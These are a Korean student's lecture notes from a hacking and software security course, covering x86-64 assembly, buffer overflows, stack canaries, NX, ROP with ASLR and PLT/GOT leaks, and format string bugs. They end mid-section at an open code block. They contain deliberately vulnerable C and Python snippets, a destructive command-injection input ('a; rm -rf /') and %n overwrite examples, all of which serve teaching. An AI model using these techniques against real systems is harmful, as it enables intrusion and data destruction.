# 해킹및정보보안

#### Introduction

별도의 교재는 따로 존재하지 않는다. `실습 위주`
선수 과목: C, Python, CSE3030(컴퓨터시스템개론) `Intel x86-64`, CSE4100(시스템프로그래밍)

`plus alpha: ChatGPU의 사용에 관하여`
- 과제에 사용하는 것은 **기본적으로 허용**이 된다.
- 다만, 허용이 된다라는 것이 쓰기를 권장하는 것은 **절대 아니**라는 것을 알고 넘어가자.
- 스스로 사유하여 발전하는 경쟁력 있는 인재가 되고 싶다면 너무 의존하지 않는 것이 좋을 것이다.
- 이 수업에선 ChatGPT가 사실상 많이 도움이 되진 않을것이다.

# 1. Course Overview

## 1.1 Goal and Scope of this Course

`5p.`
사용자가 모종의 Request를 Server에 보내고
Server가 Handle을 통해 Response를 한다.

`6p.`
해커가 서버의 취약점을 파고들어 공격을 하는 것, 그것이 해킹이다.

`7p.`
본 강의에서 우리는 **Software Security**에 대해서 집중할 것이다.
- Vulnerability 취약점
- Exploitation 공격
- Mitigation 방어
- Detection 감지

`8p.`
어떤 Software를 다룰것인가?
- Linux Applications
- OS, web도 가볍게 다를 것이다.

`9p.`
Hacking(CSE4104) != Cryptography(CSE4188)

## 1.2 Basic concepts and Terminologies in Security

#### CIA Properties
> Security의 목표
1. **C**onfidentiality, 기밀성: 보안 자료는 보안으로 유지되어야한다.
2. **I**ntegrity, 무결성: 데이터가 변조되면 안된다.
3. **A**vailablity, 가용성: 사용 가능해야한다.

#### Common Types of Attacks
> Exploitation, 공격의 양상
1. Denial-of-Service: 프로그램을 과부하 상태로 만들어 사용자들이 해당 자원에 접근할 수 없도록 하는 공격
2. Code Execution: 악의적 코드가 취약한 시스템에서 실행되도록 만드는 공격
3. Privilege Escalation: 강제 권한 상승
4. Information Leakage: 의도하지 않게 민감한 정보가 노출되도록 만드는 공격

#### Threat Model
> 넓은 의미: 어떤 시스템의 전반적인 취약점을 파악하고 검사하는 모델 자체
>> 좁은 의미: 
>> - 임의의 유저에게 무엇을 허가해줄지
>> - 해커가 어떤 공격을 하고자 하는지
>> - 해커가 어떤 대상을 공격할지
- 좁은 의미가 더 많이 쓰인다. 일종의 시나리오라고 생각하면 된다.

# 2. Introduction to Software Vulnerability

소프트웨어의 버그와 취약점에 대해서 알아보자.
일단 취약점$\in$버그이며, 취약점(Vulnerability)이란 Security Issue를 일으키는 버그이다.

**Example 1**
다음은 간단한 인터넷 뱅킹 코드이다.
```python
my_balance = 1000
def send(recipient):
	print("How much do you want to send?")
	val = read_int()
	if (val <= my_balance):
		my_balance = my_balance – val
		... # Increase the balance of recipient
```
Missing validation for negative numbers
만약 사용자가 -1000이란 값을 입력했다면 오히려 잔고가 늘어나는 심각한 버그가 발생할 것이다.

**Example 2**
다음은 username으로 cmd를 생성하는 가상의 웹서비스 코드이다.
```python
def service():
	username = read_from_packet()
	logdir = "./log/" + username
	cmdline = "mkdir %s" % logdir
	os.system(cmdline)
```
Command injection attack
`"a; rm -rf /"`를 날리면 파일 시스템의 디렉토리를 삭제하는 명령어도 실행되게 되어 난리가 난다.


**Example 3**
사용자 이름을 에코백 해주는 간단한 코드
```c
int main(void) {
	char buf[32];
	printf("Input your name: ");
	scanf("%s", buf);
	printf("Your name: %s\n", buf);
	return 0;
}
```
Buffer Overflow
32보다 긴`"AA...A`를 입력하게 되면 BOF가 일어나 프로그램이 다운된다.

Buffer Overflow & Memory Corruption
`scanf()`, `gets()`
그럼 Buffer 뒤에 정확이 어떤 종류의 데이터가 덮어씌워지는가?
이를 통해 어떤 Hacking이 일어날 수 있는가? 를 찬찬히 배워나갈 것이다.

Low-level Internals
![450](../../../../z.%20Docs/img/Pasted%20image%2020240910122732.png)
컴퓨터의 Low-level operation을 컨트롤하는 것이 **Assembly** 코드이기 때문에 우리는 이에 대해 알아놔야 할 필요가 있다.

# 3. Assembly (x86-64)

## 3.1 Brief Introduction of Assembly & Intel x86

왜 Assembly를 배워야할까?
Assembly Code가 CPU가 직접적으로 이해할 수 있는 코드기도 하고
Assembly를 이해한다는 것은 CPU의 작동 방식에 한발짝 다가간다는 뜻이기 때문이다.

그렇다면 CPU는 어떻게 동작할까?
![450](../../../../z.%20Docs/img/Pasted%20image%2020240910125134.png)
>Inst Fetch -> CPU works by Inst -> PC update point at the next Inst
- Inst를 Fetch해오는 것도 결국 컴퓨터이기 때문에 byte sequence를 Fetch 해오는 것이다.

Intel x86은 뭐죠 그럼?
x86은 Intel에서 개발된 CPU 아키텍처 family이다.
x86-64란 64bit 체계로 돌아가는 그 중의 하나인 것이다.
이는 Assembly 언어를 부르는 명칭이기도 하다.

## 3.2 Data Representation in CPU and Memory

여기서도 핵심만 집고 넘어가보자.

컴퓨터의 모오든 것은 bit로 표현되어있다.
Byte Ordering에 대해 주의하자. `Endian Issue`

메모리의 구조를 살펴보자.
> Memory는 Byte의 Array이다.
![450](../../../../z.%20Docs/img/Pasted%20image%2020240910130321.png)

Word Size
> 어떤 CPU 아키텍처가 있을 때 가장 효율적으로 다룰 수 있는 데이터의 단위
- x86-64에선 8 byte
- Registers in CPU, Transfer Unit, Memory Address(Pointer Variable)
- 이론 상으로는 $0\sim 2^{64} - 1$까지 사용 가능하나 실제로는 $0\sim2^{48} - 1$까지이다.

Byte Ordering (Endian)
> x86-64에서는 Little Endian이다.
> MSB를 큰 주소(Highest Address) 저장하는 것!
- int x = 0x12345678을 메모리에 저장한다고 생각해보자.
- 그러니까 &x에 저장되어있는 값을 조사하면 x86-64에서는 78이 나오는 것이다.
	![450](../../../../z.%20Docs/img/Pasted%20image%2020240910130757.png)

★ *그런데 String은 Endian과 하등 관계가 없다.*
항상 문자열은 앞 - 뒤 -> 작은 주소(lowest) - 큰 주소(highest)이다.

## 3.3 Basic Instruction of x86-64 Assembly

#### x86-64 아키텍쳐의 Register
- %rsp: stack pointer
- %rip: instruction pointer (program counter)
다른 건 arithmetic 연산이라던가, 값 저장이라던가 자유롭게 사용 가능하지만 몇 가지 규칙들이 있다. `Calling Convection`

레지스터 하나는 8-byte이며 그 일부를 지칭하기 위한 이름들도 있다.
%rax에 long 타입 같은 걸 저장한다고 치면
4-byte짜리 %eax
2-byte짜리 %ax
그 ax를 쪼개서 또 1-byte짜리 %ah, %al가 있다.

비슷한 방식으로 명칭을 붙인것끼리 묶으면
%rax, %rbx, %rcx, %rdx
%rdi, %rsi
%r8, %r9-%r15
이렇게 묶을 수 있다.

athimetic operation
transfer data
variables are mapped to registers or memory slots

Calling convention을 간단히 소개해보겠다.
함수의 인자를 전달할 때 x86-64는 다음 순서로 전달한다.
%rdi -> %rsi -> %rdx...
Return 값은 %rax에 전달된다.

#### mov
> Data Move Instruction
>> mov   Sourve, Destination
- movb, movw, movl, movq (1, 2, 4, 8 bytes)
- 몇 바이트인지 명백할 때는 생략하기도 한다.
- Operand에는 직접 값이 들어오거나, 레지스터가 들어오거나, 주솟값이 들어오기도 한다.
	- Immediate: $0x400, $-533
	- Register: %rax, %r13
	- Memory: (%rax), 0x1000

예제 중 두 개만 봐보자.
```
movq $-147, (%rax)  // *a = -147;
mov 0x1000, %rdx    // d = *(0x1000);
```

/ Partial Access on Register
mov $1, %eax # %rax : 0x0000000000000001
%eax에 값을 저장한다 치면 아래쪽 4-byte에 저장하고 위쪽 값은 0으로 초기화된다.

/ Byte Extension
movz: zero extension `1-byte 값을 2-byte에 zero-extension 해서 넣어라`
movs: sign extension `4-byte 값을 8-byte에 sign-extension 해서 넣어라`

/ Memory Access
mov 뒤에 suffix를 생랼하면 안되는 경우라고 생각하면 된다.
movl $0x4142, (%rax)
매모리의 어느 범위를 접근하느냐에 따라 suffix를 달리 붙여줘야한다.
mov 0x20(%rbx, %rcx, 4), %rax stride가 있는 경우이다. 0x20 + 5rbx + %rcx * 4
stride는 1, 2, 4, 8중 하나만 쓸 수 있다.
배열 접근을 표현할 때 쓴다는 것을 상기하자.

#### Arithmetic & Logical Instructions

/ 두 개의 피연산자를 가지는 것들
add같은 경우 2개의 인자 밖에 없는데 두 번째 인자가 Destination의 역할도 겸한다고 생각하면 된다.
Partial Access 같은 기묘한 현상이 add에서도 일어난다는 걸 side note 해놓고 가자.

/ 하나의 피연산자만 가지는 것들
shr, sar, shl 같은 경우 두 개를 가질수도, 하나를 가질수도 있는데 하나인 경우 1이 생략된 것이라고 생각하면 된다.
shr: Logical right shift
sar: Arithmetic right shift

#### lea Instruction
> Perform complex computations
>> lea    0x20(%rbx, %rcx, 4), %rax
- 그냥 요 연산을 해서 rax에 저장을 해라 라는 instruction
- Memory Access는 일어나지 않는다.
- Pointer Computation을 위해 만들어진 Instruction이다.
- Arithmetic Operation을 할 때도 어셈블리 코드를 줄이기 위해 lea를 응용해서 사용하기도 한다.

/ mov & lea
mov은 실제로 memory access를 하는 반면
lea는 메모리 주솟값 계산까지만 하고 멈춘다.

마지막으로 pdf의 Example을 가볍게 보고 Instruction의 응용을 간단히 익혀보자.

## 3.4 Control Instructions of x86-64 Assembly

Assembly에서의 조건문과 반복문의 표현

#### Flag Registers
> %ZF, %SF, %CF, %OF
- Instruction의 결과에 따라서 자동적으로 업데이트 된다.
- 0과 1 중에 어떤 걸로 세팅이 되어있느냐에 따라 je 같은 instruction이 결정을 내린다.
- 조건을 체크하는 register들이라고 생각하면된다.
- 어떤 규칙에 따라서 업데이트 되는지에 대한 디테일은 생략하고..

/ Conditional Jump
많이 사용되는 패턴들만 한 번 살펴보자.
sub, cmp, and, test같은 operation이 실행되고
je, jne, jg, jl 같은 Conditional Jump instruction이 수행된다.
헷갈리면 pdf 38p.의 박스 안에 있는 설명처럼 외워보자.

/ jxx Instructions
나중에 필요할 때 참조 가능할 정도로만 기억해두자.

/ cmp & sub
위 inst를 하면 대부분의 경우를 커버할 수 있는데
and와 test도 0과 sign check를 할 때 많이 쓰인다.
sub, and는 %Dest를 업데이트 안하고
cmp, test는 %Dest를 업데이트 한다.

setx Dest
cmox Src, Dest

Loop, Switch는 자세히 알 필요는 없고 어셈블리 코드가 주어졌을 때 아, 이 패턴은 C 코드로 이런 느낌이겠구나 라고 할 수 있을정도면 된다.

## 3.5 Function Call in x86-64 Assembly

Memory Structure
- Code: 머신 inst를 저장한다.
- Data: 전역 변수를 저장한다.
- Stack: 함수의 실행을 관리하기 위해 사용된다.

Stack
- Bottom (High Address)
- Top (Low Address): %rsp 레지스터가 가리키고 있다.
- Top 쪽으로 쌓인다.

/ Push Instruction
1. 저장할 Value 결정
2. %rsp를 8만큼 줄인다.
3. %rsp가 가리키는 주솟값에 value를 Write한다.

/ Pop Instruction
Push와 반대

#### Change of Control-Flow

multstore: mult2를 사용한 결과를 dest가 가리키는 곳에 저장하는 함수
mult2: 곱셈을 하는 단순한 함수

#### Passing Data

/ Calling Convention
register를 push하고 pop하는 이유
call로 mult2를 부르고 어디로 돌아와야할지를 stack에 push해놓고 점프를 한다.
ret는 call 명령어와 반대로 실행된다. `= pop %rip`

multstore는 mult2를 부르는 caller이기도 하다.

#### Memory Management

/ Stack Frame
- 저장된 Return Address
- 필요한 경우 지역변수
- 필요한 경우 Callee-saved 레지스터 백업

함수 호출이 늘어날 때마다 Stack Frame이 차곡차곡 쌓여나간다.

재귀 함수의 경우 같은 함수더라도 다른 실행 flow로 취급해서 Stack Frame도 별개다.

15213: v1 지역변수를 위해 Stack Frame에 할당한 공간
왜 lea를 쓰는지 정확하게 이해하고 넘어가자!

# 4. Buffer Overflow

#### Memory Layout
![200](../../../../z.%20Docs/img/Pasted%20image%2020240924125518.png)

## 4.1 Buffer Overflow (BOF)

#### Buffer Overflow (BOF)
> 프로그램이 고정된 크기의 메모리 공간(buffer)에 저장된 데이터를 초과하여 데이터를 쓰려고 할 때 발생하는 오류

C언어
- 고정 크기 배열
- NULL 종료 문자열 처리 문제
- 메모리 Boundary 검사 없음

어떤 중요한 Data가 BOF에 의해서 오염될 수 있을까?
- Stack Frame에 저장되어있는 Return Address
- 공격자가 Return Address를 덮어 쓰면, 즉 %rip를 마음대로 조작하면 Code Execution Type의 공격으로 이어질 수 있다. `Control Hijack`

Classic Buffer Overflow
- Unsafe String-Handling: `gets()`, `scanf("%s, ...")`, `strcpy()`, `strcat()`..
- Stack Overflow랑 헷갈리지 말자:
	- 프로그램의 호출 Stack이 제한된 크기를 넘어서 Stack 공간이 모두 소진될 때 발생한다.
	- 재귀 함수 호출이 너무 깊거나 함수 호출이 너무 많이 일어나 Stack Memory가 고갈될 때 발생한다.
- Morrris Worm (1988)

이렇게 해서 가장 전통적인 BOF에 대해서 알아보았다.
하지만 BOF가 Stack에서만 일어나는 것은 아닐 것이고, 위에서 설명한 상황에서만 일어나는 것도 아닐 것이다. `True/False`

General Discussion on BOF
- Heap-Allocated Memory에서도 일어날 수 있다.
- 또한, `gets()` 같은 안전하지 않은 함수를 사용하지 않아도 `arr[-1]`와 같은 잘못된 접근을 통해서도 BOF가 일어날 수 있다.

다른 Memory Section에서도 일어날 수 있고, Unsafe 한 함수를 사용하지 않아도 일어날 수 있다는 것이다.

#### Example Program

```c
void echo(void) {
	char buf[8];
	gets(buf);
	puts(buf);
}

int main(void) {
	echo();
	return 0;
}
```

gets()는 무려 man 페이지에서도 사용하지 말라는`..` 매우 위험한 함수이다..

15글자 까지 (NULL byte까지 포함해서 16글자)는 괜찮아 보인다.
그런데 16글자부터 Segmentation Fault가 나타난다.

그렇다면 왜 17 byte부터 그런 Crush가 일어난 것일까?

Assembly를 보고 Stack Frame을 그려낼 수 있어야 한다.
- %rsp를 0x18 만큼 내려서 공간 확보
- %rid에 %rsp + 8의 주솟값 전달
- `buf[8]`의 위 아래 위치에 Unused Space가 발생하는 것을 볼 수 있다.

초록색 점선 박스를 좀 더 자세히 봐보자. `15p.`
Little Endian 때문에 헷갈릴 수도 있으니 세로 말고 가로로 봐보자.
input을 주면 초록색 화살표부터 한칸당 글자 하나씩 채워질 것이다.
Unused 8byte에는 의미 없는 초기화 되지 않은 값들이 들어가있을 것이다.
1. 8 < input:
	 - 입력을 점점 늘려가면 16p.처럼 8을 넘어가도 BOF는 일어나나 Seg Fault는 나지 않는다.
2. 16 < input:
	- 18p.를 보면 Stack의 Saved Return Address가 오염되기 시작하면서 Corrupted가 일어난다.
	- add -> ret의 순간 잘못된 값을 읽게 되는 것이다.
	- 아, 나는 401161이 아니라 401100으로 가야하는건가? 가되는 것이다. `LSB가 오염됨`
+) abc(61 62 63)를 짚어넣으면 cba(636261)로 돌아가게 된다.

![450](../../../../z.%20Docs/img/Pasted%20image%2020240926124030.png)
> 다음과 같이 왼쪽에 C 코드, 오른쪽에 Assembly를 주면 Stack Frame을 대충 그리고 가로로 긴 그림과 같은 자세한 그림도 그릴 수 있게되어야 할 것이다.

그렇다면 이를 이용해서 임의의 악성 코드를 어떻게 실행할까?

#### Code Execution

%rip Points out Stack Section (`buf[8]`)
- 정상적인 상황이라면 %rip Register는 Code Section 혹은 Shared Library Section을 가리키고 있어야 한다.
- %rip가 Stack Section을 가리키는 상황이 매우 비정상적인 상황이라는 것을 인지하고 있어야 한다.

그렇다면 해커는 어떻게 악겅 코드를 집어넣는걸까?
- "j0YX45P"란 ASCII코드로 변환하여 해석하면 x86-64 Assenbly Instruction이 된다.
- 결국 모든것은 byte의 나열이기 때문에 이렇게 할 수 있는 것이다.
결국 해커는 { push pop pop xor push }라는 일종의 함수와 같은 것을 실행할 수 있게 되는 것이다.

/ *Shellcode*
악의적인 행위를 수행하기 위해 고안된 작은 크기의 코드
주로 시스템의 제어권을 탈취하기 위해 사용된다.
- 공격자가 시스템의 취약점을 악용해 쉘코드를 실행하면, 공격자는 해당 시스템에서 쉘을 실행하여 다양한 명령어를 수행할 수 있다.
- 이제 여기에 ls; rm-rf* 날리면 끝나는 것이다.

그런데 여기까지는 꽤나 옛날의, 역사 깊은 공격방법이다.
수십년 간의 공방의 세월을 무시하지 말자.

우선 기본적인 BOF의 방어방법을 봐보자.
1. `fgets()`나 `scanf("%8s", ...)`와 같은 boundary safe한 함수를 사용하자.
	- BOF 취약점을 원천 제거해버리자.
2. Exploit Mitigation
	- BOF 취약점이 있더라도 악성 코드 실행 자체를 막아보자.

## 4.2 ⚔️ of Buffer Overflow

#### 🛡️ (Mitigation) Stack Canary
> 함수 호출 시 Stack Frame에 특별한 **Canary** 값을 삽입하고, 함수가 종료될 때 그 값이 변조되지 않았는지 확인하는 방식으로 동작한다.
> **Canary** 값이 변경되면 프로그램은 이를 인지하고 실행을 중단하여 BOF 공격을 차단한다.
- Assembly를 보면 함수에 진입하자 마자 Canary Setup을 하는 것을 볼 수 있다.
- %rax에 Random한 값들을 짚어넣어서 buf 아래에 짚어넣는다.
- Canary check에서 값 비교를 통해 값이 변하지 않았을 때만 Assembly의 밑으로 넘어간다.

/ 🛡️ 🔫 *Stack Canary* ★★★
Canary를 다시 우회해보자.
1. 악성코드 실행을 포기:
	- Canary 전에 있는 다른 Local Variable에 있는 값을 다른 값으로 덮어씌우는 것은 가능하다는 것인데, 이만으로도 충분히 위험한 공격이다.
2. Heap에서의 BOF exploit:
	- Stack이 아닌 영역은 Canary가 커버를 못한다.
	- Overwrite Hunction Pointer Field in an Heap-Allocated Struct
3. Canary로 탐지되지 않는 특정 Type의 BOF:
	- 10p. 같은 `arr[idx]` 공격은 Canary로 막을 수 없다.
4. Memory Disclosion:
	- Canary의 값 자체를 알아낸다.

#### 🔫 (Bypassing) Memory Disclosure

write는 boundary-safe하지 않다.
write 인자로 받는 len을 아무런 검사도 안하고 출력하면 사용자가 원하는 바이트만큼 일어낼 수 있게된다.
따라서 Stack Canary 값을 알아낼 수 있게된다.

#### 🛡️ (Mitigation) NX

NX: Non-eXecutable Memory
말그대로 메모리를 실행 불가능하게 만들어서 BOF 공격을 막는 방법이다.

강의자료 3p.를 보며 생각해보자.
예전에는 %rip로 가리킬 수 있기만 하면 모든 영역이 executable 했는데 이를 막겠다는 것이다.

stack영역은 Not Executable한 영역이라고 설정할 수 있는 것으로 설정하는 것이 NX set이다.
Stack, Heap, Data Section의 -r, -w, -x 등을 설정 가능하다.

으레 그렇든 BOF의 모든 공격으로부터 안전하진 않다.
이에 대해서는 강의자료 5에서 이어나가겠다.0

## Access Control & SUID

가장 쉬운 예제: file의 permission, `-rwxr..`

# 5. ROP(Return-oriented Programming)

## 5.1 System Call (Syscall)

User Program <- System Call -> OS(Kenel)

Syscall의 Assembly는 어떻게 생겼을까?
일단 함수 호출과 비슷하긴한데, 이제 이 함수가 Kernel의 함수이다.
$0x2 같은 인자, 익숙할 것이다.
강의자료에는 진짜 간단하게 소개되어있긴한데, 후에 좀 더 자세히 다루겠다.

우리가 만약 `open()`을 했을때, 우리는 Library의 syscall들을 호출하기위해 정의 되어있는 Assembly Instruction을 호출하는 것이다.

좀 더 high level한 함수는 `fopen()`인데, 이 역시 결국은 Library에서 syscall들을 부르는 구조를 가지고 있다.

## 5.2 ROP & ASLR

`7p.`

앞에서 우리는 NX까지 했다. 
만약 NX가 도입되었다고 했을 때, 그럼 우리는 이를 또 어떻게 Attack할 수 있을까?

#### 🔫 Code Reuse Attack
> 공격자가 취약한 프로그램의 코드를 새로 작성하지 않고 기존의 정상적인 코드 조각(함수나 라이브러리 코드)을 재사용하여 공격을 수행하는 기법
- 예를들어, `execve()`에 argument로 `/bin/sh`만 전달할 수 있다면 Shellcode를 굳이 짤 필요없이 shell을 불러올 수 있다.
- 이를 막겠다고 Memory의 Shared Library Section에 있는 Library Code를 실행 불가능하게 하면 빈대 잡자고 초가상간 불태우는 것이나 마찬가지다.

/ *Return-to-Libc Attack*
옛날의 Code Reuse Attack이다. 다음과 같은 이유로 비교적 쉬운 환경에서 공격이 가능했다.
- x86-32 system 시절엔 argument를 조작하는 것이 쉬웠다.
- Library Code들이 쉽게 예측 가능한 주소에 지정이 되어있었다.

하지만 우린 x86-64 system을 고려하기 때문에 그냥 이런 Attack이 있었다는 것만 알아두자.
그렇다면 우리는 어떻게 공격해야할까?

**Challenge #1**
```
어떻게 execve()에 첫번째 argument로 `/bin/sh`를 전달할 것인가?
```
%rdi가 우리가 원하는 `/bin/sh`를 가리키게 하고 %rip로 실행
참고로 %rdi, %rsi 레지스터 등을 오염시키는 건 아직 다룬 적이 없다.

**Challenge #2**
```
ASLR(Address Space Layout Randomization)로 Memory Section을 Randomization을 했는데, 이를 어떻게 탐지할 것인가?
```
![450](../../../../z.%20Docs/img/Pasted%20image%2020241010123134.png)
다음과 같이 실행시킬 때마다 Section의 위치가 바뀐다. 그런데 Data, Code는 Performance 상의 이유로 그대로인 것을 볼 수 있다.
물론 현대에는 Data와 Code도 모두 Radomization되어있다.

#### 🔫 ROP (Return-oriented Programming)
> 프로그램의 반환 주소를 조작하여 메모리 내에 있는 ROP Gadget을 연속적으로 실행하는 방식의 공격이다.

/ *ROP Gadget*
```
0x000000        pop %rdi
0x000001        ret
```
ret로 끝나는 조그만 코드 조각을 ROP Gadget이라고 한다.
일반적으로 한 두개의 명령어로 이루어져 있으며 ret(반환) 명령어로 끝난다.

**① 그럼 이 Gadget으로 뭘 하겠다는 걸까?**

`14p.`
일단 논의를 간편하게 하기위해 dummy space의 존재를 무시한다.
return address가 `buf[]` 바로 다음에 있다.
`15p.`
0x4009b3에 ROP Gadget이 있는 것을 볼 수 있다. 그럼 여기로 Jmp한다.
일단 `f()`라는 hacker아 주소를 알고있는 함수가 있다고 하자. `execve()`
우리는 이 사진과 같이 stack을 덮어씌울건데, 이렇게 하면 원하는 함수를 실행시킬 수 있다.
`16p.`
그렇다면 실행되는 과정을 한 번 보자.
return instruction이 ROP Gadget을 꺼내와서 %rip register에 쓰게되고
rsp는 증가한다.
`18p.`
%rsp에 들어있는 걸 가져와서 %rdi를 업데이트한다.
`19p.`
결과적으로 `f(0x4142);`가 실행된다.

> 결론적으로, %rdi의 값을 잘 조작해서 %rsp로 집어넣는다.

**② 그렇다면 넣어야 할 인자가 늘어난다면 어떻게 해야될까?**
`21p.`
★ Q) 이렇게 덮어썼다고 가정할 때, 첫 번째랑 두 번째 인자로 어떤 값이 전달될까?
A) `g(0x41, 0x61);`

`24p.`
첫 번째 Gadget의 return address가 착각해서 두 번째 Gadget의 시작 주소로 %rip의 값이 변화하게된다.
`26p.`
%rsp가 `g()`의 시작점이 되었을 때 %rdi와 $rsi의 값을 보자.

> 결론적으로,

**③ 그렇다면 이번엔 함수가 늘어난다면 어떻게 해야될까?**
☆ Q) 이렇게 덮어썼다고 가정할 때, 어떤 함수가 어떤 인자로 실행될까?
A) `f(0x41); h(0x61);`

`28p.`
여기까지는 이전과 동일하다. 그렇다면 `f()`에 진입한 시점에 대해서 살펴보자.
`30p.`
`f()`함수의 입장에서 보기에는 지금 %rsp 위치가 saved return address가 저장되어있는 주소이다. 그말인 즉슨 `f()`함수가 실행되며 왔다갔다 하더라도 결국 %rsp가 가리키고있는 주소로 돌아온다는 것이다.
`f()` 함수가 실행되는 동안 %rdi의 값이 유지된다고 보장할 수 없다.
`31p.`
즉 이 페이지부터 `32p.`까지의 %rdi의 값은 `...`이 되어야 맞는것이다.
`33p.`
이제 같은 flow로 `h()`도 연달아 호출되게 된다.

/ *Types of ROP Gadgets*
```
"add $1000, %rcx; ret"
"xchg %rbx, %rdx; ret"         # 두 Regitster를 Exchange 하겠다.
"mov %rax, (%rbx); ret"        # %rax의 값을 %rbx에 덮어쓰겠다.
```
이런 Gadget들을 Chainning 함으로써 공격자는 다양한 logic과 operation을 수행할 수 있게된다.

이렇게 `Challenge #1`을 극복하는 방법에 대해 알아보았다.
이제 `Challenge #2`에 대해서 다뤄보자.

#### 🛡️ ASLR(Address Space Layout Randomization)
> 메모리 주소 예측을 어렵게 하여 BOF와 같은 메모리 취약점 공격을 방지하는 것

이렇게 되면 우리는 Data랑 Code Section의 위치는 아는데 Stack Heap Library의 위치는 모르는 것이다.
	실제로 gdb로 알 수 있긴하지만 gdb를 쓰지 못한다는 가정 하에 문제를 풀어야 한다는 뜻이다.

그렇다면 위 Mitigation에 대하여 공격을 어떻게 하면 좋을까?

#### 🔫 Memory Disclosure Revisited
> 다양한 Pointer 변수들을 통해 memory Layout에 대한 힌트를 얻는 방법으로 이 위치들을 찾아가는 것이다.

다음은 Library Section, Libc 어딘가에 있는 `puts()`의 주소를 알아내오기 위한 코드이다.
```c
int main(void) {
	int (*puts_fptr)(const char *);
	void * handle = dlopen("libc.so.6", RTLD_LAZY);
	puts_fptr = dlsym(handle, "puts");
	puts_fptr("Hello world");  // puts("Hello world") -> $ Hello world
	return 0;
}
```
당연하지만 ASLR 때문에 이 함수를 다시 실행하면 `puts()`의 주소가 바뀐다.

`puts()`의 주소를 기반으로 Libc의 다른 함수들의 주소도 알수 있게 된다.
왜냐하면 Libc Library의 시작 주소는 바뀌어도 내부 배치는 고정되어있기 때문이다. `ASLR은 시작주소 까지만 건든다는 것`
- `execve()`: p + 0x840
- `puts()`: p + 0xed0

(?) If leaked fptr_puts value is 0x7ffd3ed0:
- Base address p = 0x7ffd3000
- Address of execve() = 0x7ffd3840
- 그냥 단순 더하기 빼기다.

그럼 이게 진짜 될까?
우리가 과연 `dlopen()`이나 `dlsym()`이라는 요상한 함수를 쓸까?
안 쓸 것이다.
따라서 함수 포인터를 이용한 이 방법은 많이 사용되지 않는다.

이 코드가 우리에게 좀 더 익숙할 것이다. 그럼 이 코드도 공격 가능할까?
```c
int main(void) {
	char buf[8];
	write(1, "Hello", 5);
	read(0, buf, 160);
	return 0;
}
```
놀랍게도 Canary를 가정하지 않고 NX와 ASLR만 있다고 가정하면 공격 가능하다.

이를 위해선 자그마한 배경지식이 필요하다.

/ *Library Function Call*
다음 AS&T 코드를 보자.
```nasm
...
0x400579:    call 0x400430 <write@plt>
..

<write@plt>
0x400430     jmp *0x601018  # GOT entry ..
```
write@plt를 gdb를 실행시켜 봤다면 본적이 있을 것이다. 이게 뭘까?

/ *PLT and GOT*
![450](../../../../z.%20Docs/img/Pasted%20image%2020241015124853.png)
GOT: 함수 포인터들을 담고있는 테이블
- GOT는 runtime시 함수가 호출되어야하는 상황이 왔을 때 table entry가 동적으로 채워지게 된다. (컴파일 시 생성되는게 아니다!)
PLT: 이 테이블을 가리키는 snippet

그럼 GOT는 자동으로 만들어지니까 Libc의 함수 포인터에 대한 데이터를 알아낼 수 있게되지 않을까? 가 Main Idea다. 이는 우리가 앞에 배웠던 ROP로 가능하다.

#### 🔫 ROP for Memory Disclosure
44p., 45p. `이부분 제대로 안 들음... 물어보자`
write 함수 호출
뒤에 다른 ROP Gadget을 보내줌으로써 다른 함수들도 마음대로 호출할 수 있다.
그렇게 해서 최종적으로 40p.의 코드도 exploit하는 것이 가능하다.

**Note**
- Libc 파일로 접근하지 못하더라도 여전히 Attacker는 Libc의 버전을 유추할 수 있다.
- 위에서는 Library Section만 하긴 했는데, Stack이나 Heap같은 경우도 똑같은 Idea를 사용하는 것이 가능하다.

/ *Position-Independent Executable (PIE)*
ASLR의 진화 버전으로, Data와 Code도 Radomization 가능하게 된 것 `기술의 발전이란`
- 컴파일러가 Assembly Code를 생성할 때 굉장히 Overhead가 커지게 되지만, 보안의 관점에서 Worth-It 하다고 판단했기 때문에 이 기술이 생겨난 것이다.

**Lesson**
- 해커는 우리가 생각했던 것보다 집요하군 `집착광해커`
- 내가 코드를 생각보다 안전하게 잘 짜야겠구나 SegFault 없앴다고 기뻐할 때가 아니란 뜻
- PLT/GOT의 존재 같은 것, 컴퓨터 시스템의 내부 구조를 잘 알고 있어야 안전한 코드도 잘 짤 수 있을 것이다.

--------------------------------------------------------

# 6. Format String Bug

이제 BOF말고 다른 취약점에 대해서도 알아보자.

#### Format String Bug
> 사용자 입력을 그래로 `printf()`와 같은 **형식 지정 문자열 함수**에 전달할 때 발생하는 보안 취약점이다.
- BOF만큼 많이 일어나는 취약점은 아니다.

오랜만에 `printf()`를 살펴볼까?
/ `int printf(const char *format, ...)`
- format string을 format specifier를 사용하여 인자에 지정한 내용을 출력하는 함수이다.
- format specitier를 만날 때마다, 출력해야 할 인자가 하나 들어왔구나, 하고 형식에 따라 출력하는 방식이다.

그렇다면 `ptinrf()`사용 시 할 수 있는 실수들에 대해서 살펴보자.
```c
printf("%d %c %x\n", i, c);
```
- `%x`를 처리하기 위해서 우리가 인자로 전달하지 않은 4번째 argument까지 처리하려든다.
- **Result:** x86-64에 따르면 `%rdi -> %rsi -> %rdx -> %rcx -> %r8 -> %r9`이므로 `%rcx`의 value 해당하는 값을 출력하게된다.

더 심각한 실수는 다음과 같다.
```c
printf(buf);
```
- **Result:** buf의 개수에 따라 %rdi부터 %r9 까지의 레지스터들이 어떤 값을 가지고 `printf()`함수를 작동시켰구나를 알수있게된다.
- 다음과 같이 우리가 실제로 사용하지 않는, return addr 옆에 차곡차곡 쌓여있는 인자들도 가져올 수 있다.<br>![300](../../../../z.%20Docs/img/Pasted%20image%2020241017122824.png)

`9p.`
⚠️ Stack에서의 Memory Disclosure
우리가 format specifier를 계속 제공하기 시작하면 `buf[64]`의 내용까지 가서 출력하기 시작한다. ASCII 코드로 해석하면 `%11x`가 될 것이다.

`10p.`
⚠️ 임의의 주솟값으로의 Memory Disclosure
0x414243이라는 임의의 주솟값을 가지고 memory disclosure을 일으킬 수 있는 것이다.

`11p.`
⚠️ Overwriting Memory, 출력된 Character Byte의 개수를 Store
read만 가능할 뿐, 덮어쓰는 건 못한다.
고 생각했는가?
`%n` specifier를 사용하면 가능하다!
```c
printf("ABCDE12345%n\n", &i); // i = 10
printf("%d%n\n", 100, &j); // j = 3
```

따라서 FSB로 Control Hijack을 하는 Main Idea는 다음과 같다.
>> "몇 번째" 값을 "어떤 값"으로 덮어씌울까?
- "몇 번째": `%s`로 read
- "어떤 값": `%n`로 write

`printf()`의 허술함은 여기서 끝나지 않는다.
```c
